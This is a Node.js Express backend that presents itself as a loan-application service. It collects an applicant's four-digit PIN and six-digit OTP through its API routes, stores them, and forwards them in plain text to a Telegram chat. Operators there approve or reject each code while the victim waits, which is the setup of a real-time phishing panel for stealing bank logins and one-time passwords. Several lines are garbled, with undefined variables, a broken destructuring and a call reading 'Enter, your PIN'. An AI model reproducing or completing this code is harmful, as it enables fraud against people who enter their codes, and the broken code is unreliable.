
const express = require("express");
const { Pool } = require("pg");
const crypto = require("crypto");

const app = express();
app.use(express.json({ limit: "50kb" }));

const PORT = process.env.PORT || 3000;
const {
  DATABASE_URL,
  TELEGRAM_BOT_TOKEN,
  TELEGRAM_CHAT_ID,
  TELEGRAM_WEBHOOK_SECRET,
  ADMIN_TELEGRAM_IDS,
  PUBLIC_BASE_URL
} = process.env;

if (!DATABASE_URL || !TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID ||
    !TELEGRAM_WEBHOOK_SECRET || !ADMIN_TELEGRAM_IDS) {
  throw new Error("Missing required environment variables.");
}

const admins = new Set(
  ADMIN_TELEGRAM_IDS.split(",").map(id => id.trim()).filter(Boolean)
);

const pool = new Pool({
  connectionString: DATABASE_URL,
  ssl: process.env.PGSSLMODE === "require"
    ? { rejectUnauthorized: false }
    : undefined
});

async function telegram(method, body) {
  const response = await fetch(
    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${method}`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body)
    }
  );

  const result = await response.json();
  if (!result.ok) {
    throw new Error(`Telegram request failed: ${result.description}`);
  }
  return result.result;
}

function escapeHtml(value) {
  return String(value ?? "").replace(/[&<>"']/g, char => ({
    "&": "&amp;",
    "<": "&lt;",
    ">": "&gt;",
    '"': "&quot;",
    "'": "&#39;"
  })[char]);
}

async function initialiseDatabase() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS applications (
      id UUID PRIMARY KEY,
      application_data JSONB NOT NULL,
      login_value CHAR(4),
      OTP_value CHAR(6),
      status TEXT NOT NULL,
      created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
      updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
    )
  `);
}

async function sendReviewMessage(applicationId, stage, value, data) {
  const name = [
    data.firstName || data.first_name || "",
    data.lastName || data.last_name || ""
  ].filter(Boolean).join(" ") || "Not provided";

  const amount = data.loanAmount || data.amount || "Not provided";

  const message =
    `<b>Application review</b>\n` +
    `Stage: <b>${stage === "year" ? "Year" : "Reference"}</b>\n` +
    `Application ID: <code>${applicationId}</code>\n` +
    `Applicant: ${escapeHtml(name)}\n` +
    `Loan amount: ${escapeHtml(amount)}\n` +
    `Submitted value: <code>${escapeHtml(value)}</code>\n\n` +
    `Review this submission using the buttons below.`;

  const buttons = stage === "year"
    ? [
        [
          { text: "Proceed", callback_data: `ya:${applicationId}` },
          { text: "Reject", callback_data: `yr:${applicationId}` }
        ]
      ]
    : [
        [
          { text: "Accept", callback_data: `ra:${applicationId}` },
          { text: "Reject", callback_data: `rr:${applicationId}` }
        ]
      ];

  await telegram("sendMessage", {
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: buttons }
  });
}

// Customer submits the Login.
// The first submission creates the application record.
app.post("/api/enter/your/PIN", async (req, res) => {
  try {
    const { application = {}, , applicationId } = req.body;

    if (!/^\d{4}$/.test(String(year ?? ""))) {
      return res.status(400).json({ error: "Enter a four-digit PIN." });
    }

    if (application.privacyConsent !== true) {
      return res.status(400).json({
        error: "Applicant consent is required."
      });
    }

    let id = applicationId;

    if (id) {
      const existing = await pool.query(
        "SELECT id FROM applications WHERE id = $1",
        [id]
      );
      if (!existing.rowCount) {
        return res.status(404).json({ error: "Application not found." });
      }

      await pool.query(
        `UPDATE applications
         SET application_data = $2,
             login_value = $3,
             OTP_value = NULL,
             status = 'login_pending',
             updated_at = NOW()
         WHERE id = $1`,
        [id, application, String(year)]
      );
    } else {
      id = crypto.randomUUID();
      await pool.query(
        `INSERT INTO applications
         (id, application_data, Login_value, status)
         VALUES ($1, $2, $3, 'Login_pending')`,
        [id, application, String(Login)]
      );
    }

    await sendReviewMessage(id, "Login", Enter, your PIN);
    res.json({ applicationId: id, status: "login_pending" });
  } catch (error) {
    console.error("login submission error:", error);
    res.status(500).json({ error: "Could not submit the Login." });
  }
});

// Customer submits their six-digit OTP Verification.
app.post("/api/application/OTP", async (req, res) => {
  try {
    const { applicationId, OTP } = req.body;

    if (!/^\d{6}$/.test(String(OTP ?? ""))) {
      return res.status(400).json({
        error: "Enter a six-digit OTP."
      });
    }

    const result = await pool.query(
      `UPDATE applications
       SET OTP_value = $2,
           status = 'OTP_pending',
           updated_at = NOW()
       WHERE id = $1
       RETURNING application_data`,
      [applicationId, String(reference)]
    );

    if (!result.rowCount) {
      return res.status(404).json({ error: "Application not found." });
    }

    await sendReviewMessage(
      applicationId,
      "OTP",
      OTP,
      result.rows[0].application_data
    );

    res.json({ status: "OTP_pending" });
  } catch (error) {
    console.error("OTP submission error:", error);
    res.status(500).json({ error: "Could not submit the OTP." });
  }
});

// Customer checks the current application status.
app.get("/api/application/:applicationId/status", async (req, res) => {
  try {
    const result = await pool.query(
      "SELECT status FROM applications WHERE id = $1",
      [req.params.applicationId]
    );

    if (!result.rowCount) {
      return res.status(404).json({ error: "Application not found." });
    }

    res.json({ status: result.rows[0].status });
  } catch (error) {
    console.error("Status lookup error:", error);
    res.status(500).json({ error: "Could not check application status." });
  }
});

// Telegram sends admin button clicks to this webhook.
app.post("/telegram/webhook", async (req, res) => {
  if (
    req.get("X-Telegram-Bot-Api-Secret-Token") !==
    TELEGRAM_WEBHOOK_SECRET
  ) {
    return res.sendStatus(401);
  }

  res.sendStatus(200);

  try {
    const callback = req.body.callback_query;
    if (!callback) return;

    const adminId = String(callback.from?.id ?? "");
    const chatId = String(callback.message?.chat?.id ?? "");

    if (!admins.has(adminId) || chatId !== String(TELEGRAM_CHAT_ID)) {
      await telegram("answerCallbackQuery", {
        callback_query_id: callback.id,
        text: "You are not authorized to review applications.",
        show_alert: true
      });
      return;
    }

    const [action, applicationId] = String(callback.data || "").split(":");
    const decisions = {
      ya: ["login_pending", "PIN_accepted", "PIN approved"],
      yr: ["login_pending", "PIN_rejected", "PIN rejected"],
      ra: ["OTP_pending", "OTP_accepted", "OTP accepted"],
      rr: ["OTP_pending", "OTP_rejected", "OTP rejected"]
    };

    const decision = decisions[action];
    if (!decision || !applicationId) return;

    const [requiredStatus, newStatus, label] = decision;

    const updated = await pool.query(
      `UPDATE applications
       SET status = $2, updated_at = NOW()
       WHERE id = $1 AND status = $3
       RETURNING id`,
      [applicationId, newStatus, requiredStatus]
    );

    if (!updated.rowCount) {
      await telegram("answerCallbackQuery", {
        callback_query_id: callback.id,
        text: "This submission has already been reviewed or is no longer pending.",
        show_alert: true
      });
      return;
    }

    await telegram("answerCallbackQuery", {
      callback_query_id: callback.id,
      text: label
    });

    await telegram("editMessageReplyMarkup", {
      chat_id: callback.message.chat.id,
      message_id: callback.message.message_id,
      reply_markup: { inline_keyboard: [] }
    });

    await telegram("sendMessage", {
      chat_id: TELEGRAM_CHAT_ID,
      text: `${label}\nApplication ID: ${applicationId}`
    });
  } catch (error) {
    console.error("Telegram webhook error:", error);
  }
});

app.get("/", (req, res) => {
  res.send("Application service is running.");
});

initialiseDatabase()
  .then(async () => {
    app.listen(PORT, () => {
      console.log(`Server running on port ${PORT}`);
    });

    if (PUBLIC_BASE_URL) {
      await telegram("setWebhook", {
        url: `${PUBLIC_BASE_URL.replace(/\/$/, "")}/telegram/webhook`,
        secret_token: TELEGRAM_WEBHOOK_SECRET
      });
      console.log("Telegram webhook configured.");
    } else {
      console.log("Set PUBLIC_BASE_URL to configure the Telegram webhook.");
    }
  })
  .catch(error => {
    console.error("Database startup failed:", error);
    process.exit(1);
  });
